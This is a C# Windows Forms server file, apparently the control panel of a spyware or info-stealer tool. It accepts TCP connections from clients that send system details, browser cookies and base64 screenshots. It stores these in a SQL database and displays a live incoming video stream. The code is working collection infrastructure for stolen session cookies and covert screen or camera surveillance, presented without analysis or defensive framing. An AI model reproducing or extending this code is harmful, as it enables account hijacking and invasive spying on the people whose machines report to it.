using System;
using System.Data.SqlClient;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ServerTest
{
    public class Server
    {
        private Socket textSocket;
        private Socket videoSocket;

        private bool isRunning;
        private TextBox infoTextBox;
        private Outils outilsControl;

        private SqlConnection cnx;
        private string currentTime;

        public Server(int port, int videoPort, TextBox textBox, Outils outilsControl)
        {
            textSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint iep = new IPEndPoint(IPAddress.Parse("0.0.0.0"), port);
            textSocket.Bind(iep);

            videoSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint videoEndPoint = new IPEndPoint(IPAddress.Any, videoPort);
            videoSocket.Bind(videoEndPoint);

            isRunning = false;
            infoTextBox = textBox;
            this.outilsControl = outilsControl;
        }

        public void Start()
        {
            isRunning = true;
            textSocket.Listen(5);
            videoSocket.Listen(5);
            AddTextToInfoTextBox("Serveur démarré. En attente de connexions...");

            Task.Run(() => AcceptTextClients());
            Task.Run(() => AcceptVideoClients());
            AddTextToInfoTextBox("Client Connected...");
        }

        private void AcceptTextClients()
        {
            while (isRunning)
            {
                Socket clientSocket = textSocket.Accept();
                Task.Run(() => Communication(clientSocket));
            }
        }

        private void AcceptVideoClients()
        {
            while (isRunning)
            {
                Socket clientSocket = videoSocket.Accept();
                Task.Run(() => ReceiveVideoData(clientSocket));
            }
        }

        private void Communication(Socket clientSocket)
        {
            NetworkStream ns = new NetworkStream(clientSocket);
            StreamReader reader = new StreamReader(ns);
            int i = 0;

            try
            {
                while (true)
                {
                    string os = reader.ReadLine();
                    string motherboard = reader.ReadLine();
                    string processor = reader.ReadLine();
                    string ram = reader.ReadLine();
                    string disk = reader.ReadLine();
                    string cookies = reader.ReadLine();

                    string screenshotBase64 = reader.ReadLine();
                    byte[] screenshot = Convert.FromBase64String(screenshotBase64);

                    InsertDataIntoDatabase(os, motherboard, processor, ram, disk, screenshot, cookies);
                    i++;
                    currentTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    AddTextToInfoTextBox("Les Données " + i + " reçues et stockées dans la base de données à " + currentTime);
                }
            }
            catch (Exception ex)
            {
                AddTextToInfoTextBox("Erreur lors de la lecture des données: " + ex.Message);
            }
            finally
            {
                reader.Close();
                ns.Close();
                clientSocket.Close();
            }
        }

        private void ReceiveVideoData(Socket clientSocket)
        {
            NetworkStream ns = new NetworkStream(clientSocket);

            try
            {
                while (isRunning)
                {
                    byte[] lengthBuffer = new byte[4];
                    int bytesRead = ns.Read(lengthBuffer, 0, lengthBuffer.Length);
                    if (bytesRead == 0) break;

                    int frameLength = BitConverter.ToInt32(lengthBuffer, 0);
                    //AddTextToInfoTextBox($"Frame length: {frameLength}");
                    byte[] frameBuffer = new byte[frameLength];

                    int totalBytesRead = 0;
                    while (totalBytesRead < frameLength)
                    {
                        bytesRead = ns.Read(frameBuffer, totalBytesRead, frameLength - totalBytesRead);
                        if (bytesRead == 0) break;
                        totalBytesRead += bytesRead;
                    }

                    //AddTextToInfoTextBox($"Total bytes read: {totalBytesRead}");

                    if (totalBytesRead == frameLength)
                    {
                        using (MemoryStream ms = new MemoryStream(frameBuffer))
                        {
                            Bitmap bitmap = new Bitmap(ms);
                            DisplayFrame(bitmap);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                AddTextToInfoTextBox("Erreur lors de la réception de la vidéo : " + ex.Message);
            }
            finally
            {
                ns.Close();
                clientSocket.Close();
            }
        }

        private void DisplayFrame(Bitmap bitmap)
        {
            if (outilsControl.VideoPictureBox.InvokeRequired)
            {
                outilsControl.VideoPictureBox.Invoke(new Action(() => DisplayFrame(bitmap)));
            }
            else
            {
                if (outilsControl.VideoPictureBox.Image != null)
                {
                    outilsControl.VideoPictureBox.Image.Dispose();
                }
                outilsControl.VideoPictureBox.Image = bitmap;
            }
        }

        private void InsertDataIntoDatabase(string os, string motherboard, string processor, string ram, string disk, byte[] screenshot, string cookies)
        {
            string query = "INSERT INTO receivedData1 (OS, motherboard, processeur, ram, hardDisk, captureData, cookies, receivedAt) " +
                           "VALUES (@OS, @Motherboard, @Processor, @RAM, @Disk, @Screenshot, @cookies, @ReceivedAt)";

            using (SqlConnection cnx = Program.GetSqlConnection())
            {
                using (SqlCommand command = new SqlCommand(query, cnx))
                {
                    command.Parameters.AddWithValue("@OS", os);
                    command.Parameters.AddWithValue("@Motherboard", motherboard);
                    command.Parameters.AddWithValue("@Processor", processor);
                    command.Parameters.AddWithValue("@RAM", ram);
                    command.Parameters.AddWithValue("@Disk", disk);
                    command.Parameters.AddWithValue("@Screenshot", screenshot);
                    command.Parameters.AddWithValue("@cookies", cookies);
                    command.Parameters.AddWithValue("@ReceivedAt", DateTime.Now);

                    cnx.Open();
                    command.ExecuteNonQuery();
                }
            }
        }

        private void AddTextToInfoTextBox(string text)
        {
            if (infoTextBox.InvokeRequired)
            {
                infoTextBox.Invoke(new MethodInvoker(() => AddTextToInfoTextBox(text)));
            }
            else
            {
                infoTextBox.AppendText(text + Environment.NewLine);
            }
        }

        public void Stop()
        {
            isRunning = false;
            textSocket.Close();
            videoSocket.Close();
            AddTextToInfoTextBox("Fermeture de la connexion");
        }
    }
}
